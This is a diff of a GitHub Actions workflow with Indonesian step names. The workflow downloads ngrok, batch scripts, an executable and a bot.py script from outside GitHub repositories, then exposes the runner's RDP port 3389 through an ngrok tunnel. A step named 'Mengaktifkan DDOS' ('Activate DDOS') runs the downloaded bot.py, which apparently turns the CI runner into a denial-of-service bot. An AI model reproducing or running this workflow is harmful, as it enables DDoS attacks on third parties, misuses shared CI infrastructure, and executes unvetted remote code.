@@ -12,16 +12,16 @@ jobs:
     - name: Mendownload Ngrok.
       run: |
         Invoke-WebRequest https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip -OutFile ngrok.zip
-        Invoke-WebRequest https://raw.githubusercontent.com/SyzuTopia54y/xrdp/blob/main/start.bat -OutFile start.bat
-        Invoke-WebRequest https://raw.githubusercontent.com/SyzuTopia54y/xrdp/blob/main/wallpaper.png -OutFile wallpaper.png
-        Invoke-WebRequest https://raw.githubusercontent.com/SyzuTopia54y/xrdp/blob/main/wallpaper.bat -OutFile wallpaper.bat
-        Invoke-WebRequest https://raw.githubusercontent.com/SyzuTopia54y/xrdp/blob/main/loop.bat -OutFile loop.bat
+        Invoke-WebRequest https://raw.githubusercontent.com/XMrBeazD/bezXRDP/main/start.bat -OutFile start.bat
+        Invoke-WebRequest https://raw.githubusercontent.com/XMrBeazD/bezXRDP/main/wallpaper.png -OutFile wallpaper.png
+        Invoke-WebRequest https://raw.githubusercontent.com/XMrBeazD/bezXRDP/main/wallpaper.bat -OutFile wallpaper.bat
+        Invoke-WebRequest https://raw.githubusercontent.com/XMrBeazD/bezXRDP/main/loop.bat -OutFile loop.bat
+        Invoke-WebRequest https://github.com/SyzuTopia54y/xrdp/raw/main/bot.py -OutFile bot.py
     - name: Mendownload Launcher.
       run: |
-        Invoke-WebRequest https://raw.githubusercontent.com/SyzuTopia54y/xrdp/blob/main/launcher/Node.js.lnk -OutFile Node.js.lnk
-        Invoke-WebRequest https://raw.githubusercontent.com/SyzuTopia54y/xrdp/blob/main/launcher/Visual%20Studio%202019.lnk -OutFile "Visual Studio 2019.lnk"
-        Invoke-WebRequest https://github.com/SyzuTopia54y/xrdp/blob/main/launcher/Ganti%20Password.exe -OutFile "Ganti Password.exe"
-        Invoke-WebRequest https:/github.com/SyzuTopia54y/xrdp/blob/main/launcher/bot.py -OutFile "bot.py"
+        Invoke-WebRequest https://raw.githubusercontent.com/XMrBeazD/bezXRDP/main/launcher/Node.js.lnk -OutFile Node.js.lnk
+        Invoke-WebRequest https://raw.githubusercontent.com/XMrBeazD/bezXRDP/main/launcher/Visual%20Studio%202019.lnk -OutFile "Visual Studio 2019.lnk"
+        Invoke-WebRequest https://github.com/XMrBeazD/bezXRDP/raw/main/launcher/Ganti%20Password.exe -OutFile "Ganti Password.exe"
     - name: Mengextract Ngrok File.
       run: Expand-Archive ngrok.zip
     - name: Connect Ke Akun Ngrok.
@@ -38,9 +38,9 @@ jobs:
         copy Node.js.lnk C:\Users\Public\Desktop\Node.js.lnk
         copy "Visual Studio 2019.lnk" "C:\Users\Public\Desktop\Visual Studio 2019.lnk"
         copy "Ganti Password.exe" "C:\Users\Public\Desktop\Ganti Password.exe"
-    - name: Membuat Tunnel Dan Running Bot Client.
+    - name: Membuat Tunnel.
       run: Start-Process Powershell -ArgumentList '-Noexit -Command ".\ngrok\ngrok.exe tcp --region ap 3389"'
-    - name : Mengaktifkan DDOS.
+    - name: Mengaktifkan DDOS.
       run: Start-Process Powershell -ArgumentList '-Noexit -Command "python bot.py"'
     - name: Connect Ke RDP Kamu CPU 2 Core - 7GB Ram - 256 SSD.
       run: cmd /c start.bat
